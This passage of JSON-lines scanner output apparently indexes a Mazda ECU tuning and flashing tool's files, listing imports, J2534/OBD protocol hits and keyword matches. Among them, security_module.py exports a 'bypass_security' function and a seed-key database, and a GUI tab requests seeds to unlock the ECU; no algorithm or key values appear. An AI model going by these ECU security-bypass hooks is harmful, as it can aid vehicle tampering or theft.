EXISTS vehicle_info ("}, {"type": "hardware", "line": 162, "hardware": "ECU", "content": "ecu_serial TEXT,"}, {"type": "hardware", "line": 198, "hardware": "ECU", "content": "security_core: Optional[MazdaSecurityCore] = None):"}, {"type": "hardware", "line": 200, "hardware": "ECU", "content": "Initialize secure database."}, {"type": "hardware", "line": 204, "hardware": "ECU", "content": "security_core: Security core for encryption"}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "self.security_core = security_core or MazdaSecurityCore()"}, {"type": "hardware", "line": 226, "hardware": "ECU", "content": "self.logger.info(f\"SecureDatabase initialized: {self.db_path}\")"}, {"type": "hardware", "line": 233, "hardware": "ECU", "content": "conn.execute(\"PRAGMA journal_mode=WAL\")"}, {"type": "hardware", "line": 236, "hardware": "ECU", "content": "conn.execute(\"PRAGMA auto_vacuum=FULL\")"}, {"type": "hardware", "line": 239, "hardware": "ECU", "content": "conn.execute(\"PRAGMA foreign_keys=ON\")"}, {"type": "hardware", "line": 243, "hardware": "ECU", "content": "conn.execute(create_sql)"}, {"type": "hardware", "line": 247, "hardware": "ECU", "content": "conn.execute(\"\"\""}, {"type": "hardware", "line": 277, "hardware": "ECU", "content": "\"\"\"Encrypt sensitive data using SecurityCore.\"\"\""}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "encrypted = self.security_core.encrypt_data(data_bytes)"}, {"type": "hardware", "line": 296, "hardware": "ECU", "content": "raise DatabaseSecurityError(f\"Encryption failed: {e}\")"}, {"type": "hardware", "line": 299, "hardware": "ECU", "content": "\"\"\"Decrypt sensitive data using SecurityCore.\"\"\""}, {"type": "hardware", "line": 308, "hardware": "ECU", "content": "decrypted = self.security_core.decrypt_data(encrypted_data.encode())"}, {"type": "hardware", "line": 318, "hardware": "ECU", "content": "raise DatabaseSecurityError(f\"Decryption failed: {e}\")"}, {"type": "hardware", "line": 322, "hardware": "ECU", "content": "security_level: SecurityLevel,"}, {"type": "hardware", "line": 330, "hardware": "ECU", "content": "security_level: Security level"}, {"type": "hardware", "line": 338, "hardware": "ECU", "content": "conn.execute(\"\"\""}, {"type": "hardware", "line": 339, "hardware": "ECU", "content": "INSERT INTO users (username, password_hash, security_level, permissions, created_at)"}, {"type": "hardware", "line": 344, "hardware": "ECU", "content": "security_level.value,"}, {"type": "hardware", "line": 364, "hardware": "ECU", "content": "cursor = conn.execute(\"\"\""}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "\"security_level\": SecurityLevel(row[\"security_level\"]),"}, {"type": "hardware", "line": 393, "hardware": "ECU", "content": "conn.execute(\"\"\""}, {"type": "hardware", "line": 416, "hardware": "ECU", "content": "cursor = conn.execute(\"\"\""}, {"type": "hardware", "line": 423, "hardware": "ECU", "content": "conn.execute(\"\"\""}, {"type": "hardware", "line": 446, "hardware": "ECU", "content": "cursor = conn.execute(\"\"\""}, {"type": "hardware", "line": 469, "hardware": "ECU", "content": "conn.execute(\"\"\""}, {"type": "hardware", "line": 498, "hardware": "ECU", "content": "cursor = conn.execute(\"\"\""}, {"type": "hardware", "line": 532, "hardware": "ECU", "content": "cursor = conn.execute(\"\"\""}, {"type": "hardware", "line": 561, "hardware": "ECU", "content": "conn.execute(\"\"\""}, {"type": "hardware", "line": 602, "hardware": "ECU", "content": "cursor = conn.execute(query, params)"}, {"type": "hardware", "line": 623, "hardware": "ECU", "content": "conn.execute(\"\"\""}, {"type": "hardware", "line": 659, "hardware": "ECU", "content": "cursor = conn.execute(query, params)"}, {"type": "hardware", "line": 690, "hardware": "ECU", "content": "conn.execute(\"\"\""}, {"type": "hardware", "line": 718, "hardware": "ECU", "content": "cursor = conn.execute(\"\"\""}, {"type": "hardware", "line": 741, "hardware": "ECU", "content": "async def save_vehicle_info(self, vin: str, ecu_info: Dict[str, Any]) -> bool:"}, {"type": "hardware", "line": 741, "hardware": "vehicle", "content": "async def save_vehicle_info(self, vin: str, ecu_info: Dict[str, Any]) -> bool:"}, {"type": "hardware", "line": 742, "hardware": "vehicle", "content": "\"\"\"Save vehicle information.\"\"\""}, {"type": "hardware", "line": 745, "hardware": "ECU", "content": "conn.execute(\"\"\""}, {"type": "hardware", "line": 746, "hardware": "vehicle", "content": "INSERT OR REPLACE INTO vehicle_info"}, {"type": "hardware", "line": 747, "hardware": "ECU", "content": "(id, vin, ecu_serial, software_version, calibration_version,"}, {"type": "hardware", "line": 752, "hardware": "ECU", "content": "ecu_info.get(\"serial\", \"\"),"}, {"type": "hardware", "line": 753, "hardware": "ECU", "content": "ecu_info.get(\"software_version\", \"\"),"}, {"type": "hardware", "line": 754, "hardware": "ECU", "content": "ecu_info.get(\"calibration_version\", \"\"),"}, {"type": "hardware", "line": 755, "hardware": "ECU", "content": "ecu_info.get(\"hardware_version\", \"\"),"}, {"type": "hardware", "line": 757, "hardware": "ECU", "content": "json.dumps(ecu_info)"}, {"type": "hardware", "line": 764, "hardware": "vehicle", "content": "self.logger.error(f\"Failed to save vehicle info: {e}\")"}, {"type": "hardware", "line": 767, "hardware": "vehicle", "content": "async def get_vehicle_info(self) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 768, "hardware": "vehicle", "content": "\"\"\"Get vehicle information.\"\"\""}, {"type": "hardware", "line": 771, "hardware": "ECU", "content": "cursor = conn.execute(\"\"\""}, {"type": "hardware", "line": 772, "hardware": "vehicle", "content": "SELECT * FROM vehicle_info WHERE id = 1"}, {"type": "hardware", "line": 780, "hardware": "ECU", "content": "\"ecu_serial\": row[\"ecu_serial\"],"}, {"type": "hardware", "line": 790, "hardware": "vehicle", "content": "self.logger.error(f\"Failed to get vehicle info: {e}\")"}, {"type": "hardware", "line": 800, "hardware": "ECU", "content": "conn.execute(\"\"\""}, {"type": "hardware", "line": 840, "hardware": "ECU", "content": "cursor = conn.execute(query, params)"}, {"type": "hardware", "line": 865, "hardware": "ECU", "content": "cursor = conn.execute(\"\"\""}, {"type": "hardware", "line": 886, "hardware": "ECU", "content": "cursor = conn.execute(\"\"\""}, {"type": "hardware", "line": 909, "hardware": "ECU", "content": "return self.security_core.secure_hash(json.dumps(profile_data).encode())"}, {"type": "hardware", "line": 939, "hardware": "ECU", "content": "cursor = conn.execute(f\"SELECT COUNT(*) FROM {table_name}\")"}], "security_logic": [{"type": "security_pattern", "line": 4, "pattern": "encrypt", "content": "and application configuration with encryption for sensitive data."}, {"type": "security_pattern", "line": 45, "pattern": "encrypt", "content": "enable_encryption: bool = True"}, {"type": "security_pattern", "line": 50, "pattern": "key", "content": "foreign_keys: bool = True"}, {"type": "security_pattern", "line": 53, "pattern": "encrypt", "content": "encrypt_sensitive_data: bool = True"}, {"type": "security_pattern", "line": 60, "pattern": "encrypt", "content": "Secure SQLite database with encryption integration."}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "version INTEGER PRIMARY KEY,"}, {"type": "security_pattern", "line": 79, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 81, "pattern": "password", "content": "password_hash TEXT NOT NULL,"}, {"type": "security_pattern", "line": 81, "pattern": "hash", "content": "password_hash TEXT NOT NULL,"}, {"type": "security_pattern", "line": 92, "pattern": "key", "content": "id TEXT PRIMARY KEY,"}, {"type": "security_pattern", "line": 98, "pattern": "key", "content": "FOREIGN KEY (user_id) REFERENCES users (id)"}, {"type": "security_pattern", "line": 104, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 107, "pattern": "encrypt", "content": "parameters_encrypted TEXT,"}, {"type": "security_pattern", "line": 120, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 131, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 145, "pattern": "key", "content": "id TEXT PRIMARY KEY,"}, {"type": "security_pattern", "line": 160, "pattern": "key", "content": "id INTEGER PRIMARY KEY,"}, {"type": "security_pattern", "line": 173, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 185, "pattern": "key", "content": "id TEXT PRIMARY KEY,"}, {"type": "security_pattern", "line": 204, "pattern": "encrypt", "content": "security_core: Security core for encryption"}, {"type": "security_pattern", "line": 238, "pattern": "key", "content": "if self.config.foreign_keys:"}, {"type": "security_pattern", "line": 239, "pattern": "key", "content": "conn.execute(\"PRAGMA foreign_keys=ON\")"}, {"type": "security_pattern", "line": 276, "pattern": "encrypt", "content": "def _encrypt_data(self, data: Union[str, bytes, dict]) -> str:"}, {"type": "security_pattern", "line": 277, "pattern": "encrypt", "content": "\"\"\"Encrypt sensitive data using SecurityCore.\"\"\""}, {"type": "security_pattern", "line": 278, "pattern": "encrypt", "content": "if not self.config.encrypt_sensitive_data:"}, {"type": "security_pattern", "line": 291, "pattern": "encrypt", "content": "encrypted = self.security_core.encrypt_data(data_bytes)"}, {"type": "security_pattern", "line": 292, "pattern": "encrypt", "content": "return encrypted.decode()"}, {"type": "security_pattern", "line": 295, "pattern": "encrypt", "content": "self.logger.error(f\"Data encryption failed: {e}\")"}, {"type": "security_pattern", "line": 296, "pattern": "encrypt", "content": "raise DatabaseSecurityError(f\"Encryption failed: {e}\")"}, {"type": "security_pattern", "line": 298, "pattern": "encrypt", "content": "def _decrypt_data(self, encrypted_data: str) -> Union[str, dict]:"}, {"type": "security_pattern", "line": 298, "pattern": "decrypt", "content": "def _decrypt_data(self, encrypted_data: str) -> Union[str, dict]:"}, {"type": "security_pattern", "line": 299, "pattern": "decrypt", "content": "\"\"\"Decrypt sensitive data using SecurityCore.\"\"\""}, {"type": "security_pattern", "line": 300, "pattern": "encrypt", "content": "if not self.config.encrypt_sensitive_data:"}, {"type": "security_pattern", "line": 303, "pattern": "encrypt", "content": "return json.loads(encrypted_data)"}, {"type": "security_pattern", "line": 305, "pattern": "encrypt", "content": "return encrypted_data"}, {"type": "security_pattern", "line": 308, "pattern": "encrypt", "content": "decrypted = self.security_core.decrypt_data(encrypted_data.encode())"}, {"type": "security_pattern", "line": 308, "pattern": "decrypt", "content": "decrypted = self.security_core.decrypt_data(encrypted_data.encode())"}, {"type": "security_pattern", "line": 312, "pattern": "decrypt", "content": "return json.loads(decrypted.decode())"}, {"type": "security_pattern", "line": 314, "pattern": "decrypt", "content": "return decrypted.decode()"}, {"type": "security_pattern", "line": 317, "pattern": "decrypt", "content": "self.logger.error(f\"Data decryption failed: {e}\")"}, {"type": "security_pattern", "line": 318, "pattern": "decrypt", "content": "raise DatabaseSecurityError(f\"Decryption failed: {e}\")"}, {"type": "security_pattern", "line": 321, "pattern": "password", "content": "async def create_user(self, username: str, password_hash: str,"}, {"type": "security_pattern", "line": 321, "pattern": "hash", "content": "async def create_user(self, username: str, password_hash: str,"}, {"type": "security_pattern", "line": 329, "pattern": "password", "content": "password_hash: Password hash"}, {"type": "security_pattern", "line": 329, "pattern": "hash", "content": "password_hash: Password hash"}, {"type": "security_pattern", "line": 339, "pattern": "password", "content": "INSERT INTO users (username, password_hash, security_level, permissions, created_at)"}, {"type": "security_pattern", "line": 339, "pattern": "hash", "content": "INSERT INTO users (username, password_hash, security_level, permissions, created_at)"}, {"type": "security_pattern", "line": 343, "pattern": "password", "content": "password_hash,"}, {"type": "security_pattern", "line": 343, "pattern": "hash", "content": "password_hash,"}, {"type": "security_pattern", "line": 373, "pattern": "password", "content": "\"password_hash\": row[\"password_hash\"],"}, {"type": "security_pattern", "line": 373, "pattern": "hash", "content": "\"password_hash\": row[\"password_hash\"],"}, {"type": "security_pattern", "line": 390, "pattern": "encrypt", "content": "encrypted_data = self._encrypt_data(data) if data else None"}, {"type": "security_pattern", "line": 402, "pattern": "encrypt", "content": "encrypted_data"}, {"type": "security_pattern", "line": 434, "pattern": "decrypt", "content": "\"data\": self._decrypt_data(row[\"data\"]) if row[\"data\"] else None,"}, {"type": "security_pattern", "line": 466, "pattern": "encrypt", "content": "encrypted_params = self._encrypt_data(parameters_data)"}, {"type": "security_pattern", "line": 471, "pattern": "encrypt", "content": "(name, mode, parameters_encrypted, created_at, modified_at,"}, {"type": "security_pattern", "line": 477, "pattern": "encrypt", "content": "encrypted_params,"}, {"type": "security_pattern", "line": 505, "pattern": "encrypt", "content": "parameters_data = self._decrypt_data(row[\"parameters_encrypted\"])"}, {"type": "security_pattern", "line": 505, "pattern": "decrypt", "content": "parameters_data = self._decrypt_data(row[\"parameters_encrypted\"])"}, {"type": "security_pattern", "line": 909, "pattern": "hash", "content": "return self.security_core.secure_hash(json.dumps(profile_data).encode())"}, {"type": "security_pattern", "line": 938, "pattern": "key", "content": "for table_name in self.TABLES.keys():"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "security/anti_theft.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "security/roles.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "security/user_auth.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "security/valet_mode.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "security_module.py", "lines_read": 8, "features_found": [{"type": "import", "module": "muts.security.seed_key", "line": null}, {"type": "import", "module": "MazdaECUType,", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "Legacy shim that exposes the MUTS security helpers for compatibility."}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "from muts.security.seed_key import MazdaECUType, MazdaSeedKeyDatabase, bypass_security"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "__all__ = [\"MazdaECUType\", \"MazdaSeedKeyDatabase\", \"bypass_security\"]"}], "security_logic": [{"type": "security_pattern", "line": 5, "pattern": "key", "content": "from muts.security.seed_key import MazdaECUType, MazdaSeedKeyDatabase, bypass_security"}, {"type": "security_pattern", "line": 5, "pattern": "seed", "content": "from muts.security.seed_key import MazdaECUType, MazdaSeedKeyDatabase, bypass_security"}, {"type": "security_pattern", "line": 7, "pattern": "key", "content": "__all__ = [\"MazdaECUType\", \"MazdaSeedKeyDatabase\", \"bypass_security\"]"}, {"type": "security_pattern", "line": 7, "pattern": "seed", "content": "__all__ = [\"MazdaECUType\", \"MazdaSeedKeyDatabase\", \"bypass_security\"]"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "simulators/dyno_sim.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "simulators/virtual_ecu.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts.egg-info/PKG-INFO", "lines_read": 0, "features_found": [{"type": "binary_file", "note": "Binary content not analyzed"}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [{"type": "binary_risk", "note": "Binary files may contain executable code"}], "group_tags": ["other"]}
{"file_path": "src/muts.egg-info/SOURCES.txt", "lines_read": 52, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts.egg-info/dependency_links.txt", "lines_read": 1, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts.egg-info/requires.txt", "lines_read": 16, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts.egg-info/top_level.txt", "lines_read": 1, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/__init__.py", "lines_read": 1, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/__main__.py", "lines_read": 5, "features_found": [{"type": "import", "module": ".app", "line": null}, {"type": "import", "module": "main", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/app.py", "lines_read": 8, "features_found": [{"type": "function", "name": "main", "line": 5}, {"type": "import", "module": "loguru", "line": null}, {"type": "import", "module": ".gui.main_window", "line": null}, {"type": "import", "module": "logger", "line": null}, {"type": "import", "module": "run_gui", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/main_window.py", "lines_read": 52, "features_found": [{"type": "function", "name": "run_gui", "line": 21}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "..services.integration_stack", "line": null}, {"type": "import", "module": ".tabs.cobb", "line": null}, {"type": "import", "module": ".tabs.comms", "line": null}, {"type": "import", "module": ".tabs.dashboard", "line": null}, {"type": "import", "module": ".tabs.diagnostic_library", "line": null}, {"type": "import", "module": ".tabs.diagnostics", "line": null}, {"type": "import", "module": ".tabs.dyno", "line": null}, {"type": "import", "module": ".tabs.integration", "line": null}, {"type": "import", "module": ".tabs.mds", "line": null}, {"type": "import", "module": ".tabs.mpsrom", "line": null}, {"type": "import", "module": ".tabs.muts", "line": null}, {"type": "import", "module": ".tabs.repository_explorer", "line": null}, {"type": "import", "module": ".tabs.security", "line": null}, {"type": "import", "module": ".tabs.tune_library", "line": null}, {"type": "import", "module": ".tabs.tuning", "line": null}, {"type": "import", "module": ".tabs.versa", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "IntegrationCoordinator", "line": null}, {"type": "import", "module": "CobbTab", "line": null}, {"type": "import", "module": "CommsTab", "line": null}, {"type": "import", "module": "DashboardTab", "line": null}, {"type": "import", "module": "DiagnosticLibraryTab", "line": null}, {"type": "import", "module": "DiagnosticsTab", "line": null}, {"type": "import", "module": "DynoTab", "line": null}, {"type": "import", "module": "IntegrationTab", "line": null}, {"type": "import", "module": "MDSTab", "line": null}, {"type": "import", "module": "MPSROMTab", "line": null}, {"type": "import", "module": "MUTSTab", "line": null}, {"type": "import", "module": "RepositoryExplorerTab", "line": null}, {"type": "import", "module": "SecurityTab", "line": null}, {"type": "import", "module": "TuneLibraryTab", "line": null}, {"type": "import", "module": "TuningTab", "line": null}, {"type": "import", "module": "VersaTab", "line": null}, {"type": "import", "module": "sys", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ABS", "content": "from .tabs.cobb import CobbTab"}, {"type": "hardware", "line": 5, "hardware": "ABS", "content": "from .tabs.comms import CommsTab"}, {"type": "hardware", "line": 6, "hardware": "ABS", "content": "from .tabs.dashboard import DashboardTab"}, {"type": "hardware", "line": 7, "hardware": "ABS", "content": "from .tabs.diagnostic_library import DiagnosticLibraryTab"}, {"type": "hardware", "line": 8, "hardware": "ABS", "content": "from .tabs.diagnostics import DiagnosticsTab"}, {"type": "hardware", "line": 9, "hardware": "ABS", "content": "from .tabs.dyno import DynoTab"}, {"type": "hardware", "line": 10, "hardware": "ABS", "content": "from .tabs.integration import IntegrationTab"}, {"type": "hardware", "line": 11, "hardware": "ABS", "content": "from .tabs.mds import MDSTab"}, {"type": "hardware", "line": 12, "hardware": "ABS", "content": "from .tabs.mpsrom import MPSROMTab"}, {"type": "hardware", "line": 13, "hardware": "ABS", "content": "from .tabs.muts import MUTSTab"}, {"type": "hardware", "line": 14, "hardware": "ABS", "content": "from .tabs.repository_explorer import RepositoryExplorerTab"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "from .tabs.security import SecurityTab"}, {"type": "hardware", "line": 15, "hardware": "ABS", "content": "from .tabs.security import SecurityTab"}, {"type": "hardware", "line": 16, "hardware": "ABS", "content": "from .tabs.tune_library import TuneLibraryTab"}, {"type": "hardware", "line": 17, "hardware": "ABS", "content": "from .tabs.tuning import TuningTab"}, {"type": "hardware", "line": 18, "hardware": "ABS", "content": "from .tabs.versa import VersaTab"}, {"type": "hardware", "line": 31, "hardware": "ABS", "content": "tabs = QtWidgets.QTabWidget()"}, {"type": "hardware", "line": 32, "hardware": "ABS", "content": "tabs.addTab(DashboardTab(), \"Dashboard\")"}, {"type": "hardware", "line": 33, "hardware": "ABS", "content": "tabs.addTab(DiagnosticsTab(), \"Diagnostics\")"}, {"type": "hardware", "line": 34, "hardware": "ABS", "content": "tabs.addTab(DiagnosticLibraryTab(), \"Diagnostic Library\")"}, {"type": "hardware", "line": 35, "hardware": "ABS", "content": "tabs.addTab(TuningTab(), \"Tuning\")"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "tabs.addTab(SecurityTab(), \"Security\")"}, {"type": "hardware", "line": 36, "hardware": "ABS", "content": "tabs.addTab(SecurityTab(), \"Security\")"}, {"type": "hardware", "line": 37, "hardware": "ABS", "content": "tabs.addTab(DynoTab(), \"Dyno\")"}, {"type": "hardware", "line": 38, "hardware": "ABS", "content": "tabs.addTab(IntegrationTab(integration), \"Integration\")"}, {"type": "hardware", "line": 39, "hardware": "ABS", "content": "tabs.addTab(CobbTab(integration.cobb), \"Cobb Stack\")"}, {"type": "hardware", "line": 40, "hardware": "ABS", "content": "tabs.addTab(VersaTab(integration.versa), \"Versa Stack\")"}, {"type": "hardware", "line": 41, "hardware": "ABS", "content": "tabs.addTab(MDSTab(integration.mds), \"MDS Stack\")"}, {"type": "hardware", "line": 42, "hardware": "ABS", "content": "tabs.addTab(MPSROMTab(integration.mpsrom), \"MPS ROM\")"}, {"type": "hardware", "line": 43, "hardware": "ABS", "content": "tabs.addTab(TuneLibraryTab(), \"Tune Library\")"}, {"type": "hardware", "line": 44, "hardware": "ABS", "content": "tabs.addTab(MUTSTab(integration.muts), \"MUTS Stack\")"}, {"type": "hardware", "line": 45, "hardware": "ABS", "content": "tabs.addTab(CommsTab(integration.comms), \"Comms\")"}, {"type": "hardware", "line": 46, "hardware": "ABS", "content": "tabs.addTab(RepositoryExplorerTab(), \"Repo Explorer\")"}, {"type": "hardware", "line": 48, "hardware": "ABS", "content": "window.setCentralWidget(tabs)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "src/muts/gui/tabs/cobb.py", "lines_read": 282, "features_found": [{"type": "function", "name": "__init__", "line": 9}, {"type": "function", "name": "__init__", "line": 33}, {"type": "function", "name": "request_seed", "line": 52}, {"type": "function", "name": "unlock_ecu", "line": 56}, {"type": "function", "name": "read_identification", "line": 61}, {"type": "function", "name": "__init__", "line": 68}, {"type": "function", "name": "connect", "line": 93}, {"type": "function", "name": "disconnect", "line": 99}, {"type": "function", "name": "read", "line": 103}, {"type": "function", "name": "write", "line": 111}, {"type": "function", "name": "load_real_driver", "line": 116}, {"type": "function", "name": "__init__", "line": 132}, {"type": "function", "name": "list_tables", "line": 154}, {"type": "function", "name": "list_mzrecu_tables", "line": 158}, {"type": "function", "name": "describe", "line": 166}, {"type": "function", "name": "__init__", "line": 173}, {"type": "function", "name": "toggle_power", "line": 192}, {"type": "function", "name": "press_button", "line": 196}, {"type": "function", "name": "start_virtual_ap", "line": 200}, {"type": "function", "name": "__init__", "line": 210}, {"type": "function", "name": "scan", "line": 226}, {"type": "function", "name": "clear", "line": 234}, {"type": "function", "name": "__init__", "line": 242}, {"type": "function", "name": "flash", "line": 258}, {"type": "function", "name": "__init__", "line": 266}, {"type": "function", "name": "capture", "line": 279}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "PyQt5", "line": null}, {"type": "import", "module": "...services.cobb_stack", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "QtWidgets", "line": null}, {"type": "import", "module": "CobbCoordinator,", "line": null}, {"type": "import", "module": "failed)\")", "line": null}], "components_found": [{"type": "class", "name": "CobbTab", "line": 8}, {"type": "class", "name": "CobbSecurityWidget", "line": 32}, {"type": "class", "name": "CobbJ2534Widget", "line": 67}, {"type": "class", "name": "CobbMapWidget", "line": 131}, {"type": "class", "name": "CobbHardwareWidget", "line": 172}, {"type": "class", "name": "CobbOBDWidget", "line": 209}, {"type": "class", "name": "CobbFlashWidget", "line": 241}, {"type": "class", "name": "CobbRealtimeWidget", "line": 265}], "algorithms": [], "protocols": [{"type": "protocol", "line": 23, "protocol": "J2534", "content": "sub_tabs.addTab(CobbJ2534Widget(self.coordinator), \"J2534\")"}, {"type": "protocol", "line": 26, "protocol": "OBD", "content": "sub_tabs.addTab(CobbOBDWidget(self.coordinator), \"OBD\")"}, {"type": "protocol", "line": 67, "protocol": "J2534", "content": "class CobbJ2534Widget(QtWidgets.QWidget):"}, {"type": "protocol", "line": 77, "protocol": "J2534", "content": "btn_load_driver = QtWidgets.QPushButton(\"Load real J2534 driver (cobb2)\")"}, {"type": "protocol", "line": 119, "protocol": "J2534", "content": "\"Select J2534 DLL\","}, {"type": "protocol", "line": 126, "protocol": "J2534", "content": "self.output.appendPlainText(f\"Loaded real J2534 driver from: {path}\")"}, {"type": "protocol", "line": 128, "protocol": "J2534", "content": "self.output.appendPlainText(\"Failed to load real J2534 driver (cobb2/J2534Protocol not available)\")"}, {"type": "protocol", "line": 209, "protocol": "OBD", "content": "class CobbOBDWidget(QtWidgets.QWidget):"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "from ...services.cobb_stack import CobbCoordinator, CobbSecurityService"}, {"type": "hardware", "line": 21, "hardware": "ABS", "content": "sub_tabs = QtWidgets.QTabWidget()"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "sub_tabs.addTab(CobbSecurityWidget(self.coordinator), \"Security\")"}, {"type": "hardware", "line": 22, "hardware": "ABS", "content": "sub_tabs.addTab(CobbSecurityWidget(self.coordinator), \"Security\")"}, {"type": "hardware", "line": 23, "hardware": "ABS", "content": "sub_tabs.addTab(CobbJ2534Widget(self.coordinator), \"J2534\")"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "sub_tabs.addTab(CobbMapWidget(self.coordinator), \"ECU Map\")"}, {"type": "hardware", "line": 24, "hardware": "ABS", "content": "sub_tabs.addTab(CobbMapWidget(self.coordinator), \"ECU Map\")"}, {"type": "hardware", "line": 25, "hardware": "ABS", "content": "sub_tabs.addTab(CobbHardwareWidget(self.coordinator), \"Hardware\")"}, {"type": "hardware", "line": 26, "hardware": "ABS", "content": "sub_tabs.addTab(CobbOBDWidget(self.coordinator), \"OBD\")"}, {"type": "hardware", "line": 27, "hardware": "ABS", "content": "sub_tabs.addTab(CobbFlashWidget(self.coordinator), \"Flash\")"}, {"type": "hardware", "line": 28, "hardware": "ABS", "content": "sub_tabs.addTab(CobbRealtimeWidget(self.coordinator), \"Realtime\")"}, {"type": "hardware", "line": 29, "hardware": "ABS", "content": "layout.addWidget(sub_tabs)"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "class CobbSecurityWidget(QtWidgets.QWidget):"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "btn_unlock = QtWidgets.QPushButton(\"Unlock ECU\")"}, {"type": "hardware", "line": 49, "hardware": "ECU", "content": "btn_unlock.clicked.connect(self.unlock_ecu)"}, {"type": "hardware", "line": 53, "hardware": "ECU", "content": "seed = self.coordinator.security.request_seed(CobbSecurityService.TUNING_LEVEL)"}, {"type": "hardware", "line": 56, "hardware": "ECU", "content": "def unlock_ecu(self) -> None:"}, {"type": "hardware", "line": 57, "hardware": "ECU", "content": "level = CobbSecurityService.TUNING_LEVEL"}, {"type": "hardware", "line": 58, "hardware": "ECU", "content": "success = self.coordinator.security.unlock_ecu(level)"}, {"type": "hardware", "line": 59, "hardware": "ECU", "content": "self.output.appendPlainText(\"ECU unlocked\" if success else \"Unlock failed\")"}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "ident = self.coordinator.security.read_identification()"}, {"type": "hardware", "line": 139, "hardware": "ECU", "content": "btn_list_mzrecu = QtWidgets.QPushButton(\"List MZRECU tables (cobb3)\")"}, {"type": "hardware", "line": 145, "hardware": "ECU", "content": "layout.addWidget(btn_list_mzrecu)"}, {"type": "hardware", "line": 152, "hardware": "ECU", "content": "btn_list_mzrecu.clicked.connect(self.list_mzrecu_tables)"}, {"type": "hardware", "line": 158, "hardware": "ECU", "content": "def list_mzrecu_tables(self) -> None:"}, {"type": "hardware", "line": 159, "hardware": "ECU", "content": "ecu_model = getattr(self.coordinator, \"ecu_model\", None)"}, {"type": "hardware", "line": 160, "hardware": "ECU", "content": "if ecu_model is None:"}, {"type": "hardware", "line": 161, "hardware": "ECU", "content": "self.output.appendPlainText(\"MZRECU model not available (cobb3 import failed)\")"}, {"type": "hardware", "line": 163, "hardware": "ECU", "content": "tables = sorted(ecu_model.CALIBRATION_TABLES.keys())"}, 